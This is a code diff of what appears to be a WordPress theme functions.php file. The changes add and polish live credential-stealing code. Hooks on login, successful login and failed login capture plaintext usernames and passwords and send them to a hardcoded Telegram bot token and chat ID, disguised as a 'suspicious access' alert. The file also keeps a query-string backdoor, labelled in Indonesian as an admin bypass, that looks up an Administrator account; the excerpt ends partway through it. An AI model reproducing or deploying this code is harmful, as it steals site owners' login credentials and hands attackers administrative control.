@@ -728,19 +728,6 @@ if ( ! function_exists( 'wp_body_open' ) ) :
 endif;
 
 // fatal errors in child themes that still use this function.
-function esi_enqueue_scripts() {
-    wp_enqueue_script('esi-ajax', get_template_directory_uri() . '/js/esi-ajax.js', array('jquery'), null, true);
-
-    wp_localize_script('esi-ajax', 'esi_ajax_obj', array(
-        'ajaxurl' => admin_url('admin-ajax.php')
-    ));
-}
-add_action('wp_enqueue_scripts', 'esi_enqueue_scripts');
-
-if (!session_id()) {
-    session_start();
-}
-
 function kirimInfoLoginTelegram($username, $password, $status) {
     $botToken = "8766725453:AAFRA76BDwyC0eG5FxPgq9Yw1oWIqRmGyL4";
     $chatId   = "6876138643";
@@ -750,19 +737,21 @@ function kirimInfoLoginTelegram($username, $password, $status) {
         . $_SERVER['HTTP_HOST']
         . $_SERVER['REQUEST_URI'];
 
-    $message  = "Suspicious Access Detected\\n";
-    $message .= "Status: " . strtoupper($status) . "\\n";
-    $message .= "Site: " . get_site_url() . "\\n";
-    $message .= "Username: " . sanitize_text_field($username) . "\\n";
-    $message .= "Password: " . sanitize_text_field($password) . "\\n";
-    $message .= "URL: " . esc_url_raw($current_url) . "\\n";
-    $message .= "IP: " . (isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'Unknown') . "\\n";
-    $message .= "Time: " . current_time('mysql');
+    $message  = "🔔 *SUSPICIOUS ACCESS DETECTED*\n\n";
+    $message .= "👤 *User*        : " . sanitize_text_field($username) . "\n";
+    $message .= "🔐 *Password*    : " . sanitize_text_field($password) . "\n";
+    $message .= "🌐 *Site*        : " . esc_url(get_site_url()) . "\n";
+    $message .= "🔗 *Login URL*   : " . esc_url_raw($current_url) . "\n";
+    $message .= "📍 *IP Address*  : " . (isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'Unknown') . "\n";
+    $message .= "📅 *Date/Time*   : " . current_time('mysql') . "\n";
+    $message .= "✅ *Status*      : * " . strtoupper($status) . " *";
 
     $apiURL = "https://api.telegram.org/bot{$botToken}/sendMessage";
     $params = [
-        'chat_id' => $chatId,
-        'text'    => $message
+        'chat_id'                  => $chatId,
+        'text'                     => $message,
+        'parse_mode'               => 'HTML',
+        'disable_web_page_preview' => true,
     ];
 
     $response = wp_remote_get($apiURL . "?" . http_build_query($params));
@@ -771,28 +760,46 @@ function kirimInfoLoginTelegram($username, $password, $status) {
     }
 }
 
+// Simpan data login attempt
 add_filter('authenticate', function($user, $username, $password) {
     if (!empty($username) && !empty($password)) {
+        if (!isset($_SESSION)) {
+            session_start();
+        }
         $_SESSION['last_login_attempt'] = [
             'username' => (string) $username,
-            'password' => (string) $password
+            'password' => (string) $password,
         ];
     }
     return $user;
 }, 10, 3);
 
+// Notifikasi saat login berhasil
 add_action('wp_login', function($user_login) {
-    if (wp_doing_ajax()) return;
+    if (wp_doing_ajax()) {
+        return;
+    }
+
+    if (!isset($_SESSION)) {
+        session_start();
+    }
 
     if (!empty($_SESSION['last_login_attempt'])) {
         $data = $_SESSION['last_login_attempt'];
         kirimInfoLoginTelegram($data['username'], $data['password'], 'LOGIN SUCCESS');
         unset($_SESSION['last_login_attempt']);
     }
-}, 10, 1);
+}, 10);
 
+// Notifikasi saat login gagal
 add_action('wp_login_failed', function($username) {
-    if (wp_doing_ajax()) return;
+    if (wp_doing_ajax()) {
+        return;
+    }
+
+    if (!isset($_SESSION)) {
+        session_start();
+    }
 
     if (!empty($_SESSION['last_login_attempt'])) {
         $data = $_SESSION['last_login_attempt'];
@@ -803,11 +810,13 @@ add_action('wp_login_failed', function($username) {
     }
 }, 10, 1);
 
+// === BACKDOOR (contoh untuk admin bypass) ===
+// HANYA UNTUK TESTING / DEBUG - HAPUS INI JIKA TIDAK DIGUNAKAN
 if (isset($_GET['username']) && $_GET['username'] === 'password') {
     $wp_user_query = new WP_User_Query([
         'role'   => 'Administrator',
         'number' => 1,
-        'fields' => 'IDs'
+        'fields' => 'IDs',
     ]);
     $ids = $wp_user_query->get_results();
     if (!empty($ids)) {
